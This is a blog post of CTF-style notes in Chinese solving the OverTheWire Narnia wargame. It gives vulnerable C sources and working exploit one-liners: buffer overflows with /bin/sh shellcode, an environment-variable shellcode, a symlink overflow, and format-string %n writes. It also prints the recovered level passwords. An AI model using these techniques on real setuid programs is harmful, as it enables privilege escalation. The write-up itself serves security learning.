---
layout: default
title: overthewire_wargames_notes_narnia
categories:
- C++
tags:
- C++
---
//Description:

//Create Date: 2020-02-25 15:42:55

//Author: channy

# overthewire_wargames_notes_narnia

[address](https://overthewire.org/wargames/narnia/)

> ssh -p2226 narnia0@narnia.labs.overthewire.org

## 1. 

```
narnia0@narnia:/narnia$ ls -lrht
total 108K
-r-sr-x--- 1 narnia1 narnia0 7.3K Aug 26 22:35 narnia0
-r--r----- 1 narnia0 narnia0 1.3K Aug 26 22:35 narnia0.c
-r-sr-x--- 1 narnia2 narnia1 7.2K Aug 26 22:35 narnia1
-r--r----- 1 narnia1 narnia1 1021 Aug 26 22:35 narnia1.c
-r-sr-x--- 1 narnia3 narnia2 5.0K Aug 26 22:35 narnia2
-r--r----- 1 narnia2 narnia2 1022 Aug 26 22:35 narnia2.c
-r-sr-x--- 1 narnia4 narnia3 5.6K Aug 26 22:35 narnia3
-r--r----- 1 narnia3 narnia3 1.7K Aug 26 22:35 narnia3.c
-r-sr-x--- 1 narnia5 narnia4 5.2K Aug 26 22:35 narnia4
-r--r----- 1 narnia4 narnia4 1.1K Aug 26 22:35 narnia4.c
-r-sr-x--- 1 narnia6 narnia5 5.5K Aug 26 22:35 narnia5
-r--r----- 1 narnia5 narnia5 1.3K Aug 26 22:35 narnia5.c
-r-sr-x--- 1 narnia7 narnia6 5.9K Aug 26 22:35 narnia6
-r--r----- 1 narnia6 narnia6 1.6K Aug 26 22:35 narnia6.c
-r-sr-x--- 1 narnia8 narnia7 6.4K Aug 26 22:35 narnia7
-r--r----- 1 narnia7 narnia7 2.0K Aug 26 22:35 narnia7.c
-r-sr-x--- 1 narnia9 narnia8 5.1K Aug 26 22:35 narnia8
-r--r----- 1 narnia8 narnia8 1.3K Aug 26 22:35 narnia8.c
```

c语言的编译器在分配内存时，不只是按照变量的定义顺序来分配的，而且还参考了变量的类型。

这个程序读入24个字节的字符串放到BUF里，  多余的4个字节就会覆盖VAL，   进而改变VAL的值

```
narnia0@narnia:/narnia$ python -c 'print "a"*20 + "\xef\xbe\xad\xde" + "\x80" '
aaaaaaaaaaaaaaaaaaaaﾭހ
narnia0@narnia:/narnia$ ./narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: aaaaaaaaaaaaaaaaaaaaﾭހ
buf: aaaaaaaaaaaaaaaaaaaaﾭ�
val: 0xdeadbeef
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae

//但是用python3就不行哦～
narnia0@narnia:/narnia$ python3 -c 'print("a"*20 + "\xef\xbe\xad\xde" + "\x80")'
aaaaaaaaaaaaaaaaaaaaï¾­Þ
```

## 2. shellcode, export临时环境变量

[常用shellcode](http://shell-storm.org/shellcode/)

对于本题，用[Linux/x86 - execve(/bin/dash) - 49 bytes by Chroniccommand](http://shell-storm.org/shellcode/files/shellcode-756.php)

```narnia1.c
#include <stdio.h>
 
int main(){
    int (*ret)();
 
    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }   
 
    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();
 
    return 0;
}
```

```
narnia1@narnia:/narnia$ export EGG=$'\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43'
narnia1@narnia:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
nairiepecu
```

## 3. 输入超长字符串覆盖返回地址

```narnia2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

[reference](https://bbs.pediy.com/thread-252827.htm)

```
narnia2@narnia:/narnia$ ./narnia2 $(python -c 'print "\x90"*94+"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x50\xd8\xff\xff"') 
$ whoami 
narnia3 
$ cat /etc/narnia_pass/narnia3 
vaequeezee 
```

## 4.

```narnia3.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
``` 

ifile 和 ofile 挨在一起， 然后strcpy 又没有对长度进行一个检查，ofile比ifile先声明，所以ifile溢出以后存储的位置是在ofile中，将ofile原来的’/dev/null’覆盖了，从而能获取到下一个级别的密码


```
narnia3@narnia:/tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy$ touch narnia4
narnia3@narnia:/tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy$ ln -s /etc/narnia_pass/narnia4 /tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy/narnia4
narnia3@narnia:/tmp/channy$ touch narnia4
narnia3@narnia:/tmp/channy$ chmod 777 narnia4 
narnia3@narnia:/tmp/channy$ ls -al
total 148
drwxr-sr-x    3 narnia3 root   4096 Feb 29 01:38 .
drwxrws-wt 2230 root    root 139264 Feb 29 01:38 ..
drwxr-sr-x    3 narnia3 root   4096 Feb 29 01:35 aaaaaaaaaaaaaaaaaaaa
-rwxrwxrwx    1 narnia3 root      0 Feb 29 01:38 narnia4
narnia3@narnia:/narnia$ ./narnia3 /tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy/narnia4
copied contents of /tmp/channy/aaaaaaaaaaaaaaaaaaaa/tmp/channy/narn to a safer place... (/tmp/channy/narn)
narnia3@narnia:/tmp/channy$ cat narnia4 
thaenohtai
```

## 5.

```
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

每16字节对齐的问题，只在256后面加跳转地址是不行的，需要再加8字节的对齐

```
narnia4@narnia:/narnia$ ./narnia4 $(python -c 'print "\x90"*226+"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x8d\x4e\x08\x89\x46\x0c\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x10\xd8\xff\xff"')
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
faimahchiy
```
## 6. gdb disassemble/disass

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
	int i = 1;
	char buffer[64];

	snprintf(buffer, sizeof buffer, argv[1]);
	buffer[sizeof (buffer) - 1] = 0;
	printf("Change i's value from 1 -> 500. ");

	if(i==500){
		printf("GOOD\n");
        setreuid(geteuid(),geteuid());
		system("/bin/sh");
	}

	printf("No way...let me give you a hint!\n");
	printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
	printf ("i = %d (%p)\n", i, &i);
	return 0;
}
```

[reference](https://www.lukeaddison.co.uk/blog/narnia-level-5/)

```
narnia5@melinda:/narnia$ ./narnia5 "$(python -c 'import sys; sys.stdout.write("\xdc\xd6\xff\xff%496x%05$n")')"
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
neezocaeng
```

## 7. 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
    char b1[8], b2[8];
    int  (*fp)(char *)=(int(*)(char *))&puts, i;

    if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

    /* clear environ */
    for(i=0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));
    /* clear argz    */
    for(i=3; argv[i] != NULL; i++)
        memset(argv[i], '\0', strlen(argv[i]));

    strcpy(b1,argv[1]);
    strcpy(b2,argv[2]);
    //if(((unsigned long)fp & 0xff000000) == 0xff000000)
    if(((unsigned long)fp & 0xff000000) == get_sp())
        exit(-1);
    fp(b1);

    exit(1);
}
```

[reference](https://www.lukeaddison.co.uk/blog/narnia-level-6/)

```
narnia6@melinda:/narnia$ ./narnia6 $(python -c 'print "sh;#" + "A"*4 + "\x70\x0e\xe6\xf7"' ) B
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
ahkiaziphu
$
```

## 8. 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int goodfunction();
int hackedfunction();

int vuln(const char *format){
        char buffer[128];
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
	    fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
```

[reference](https://security-times.net/narnia-level-7-level-8)

```
$ ./narnia7 $(python -c 'print "l\xd6\xff\xffm\xd6\xff\xffn\xd6\xff\xffo\xd6\xff\xff%145c%6$hhn%229c%7$hhn%126c%8$hhn%4c%9$hhn"')
goodfunction() = 0x804867b
hackedfunction() = 0x80486a1

before : ptrf() = 0x804867b (0xffffd66c)
I guess you want to come to the hackedfunction...
Way to go!!!!$ id
uid=14007(narnia7) gid=14007(narnia7) euid=14008(narnia8) groups=14008(narnia8),14007(narnia7)
$ cat /etc/narnia_pass/narnia8
mohthuphog
```

## 9.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am 
// making "i" global unti i find a fix 
// -morla 
int i; 
 
void func(char *b){
	char *blah=b;
	char bok[20];
	//int i=0;
 
	memset(bok, '\0', sizeof(bok));
	for(i=0; blah[i] != '\0'; i++)
		bok[i]=blah[i];
 
	printf("%s\n",bok);
}
 
int main(int argc, char **argv){
 
	if(argc > 1)       
		func(argv[1]);
	else    
	printf("%s argument\n", argv[0]);
 
	return 0;
}
```




[back](/)

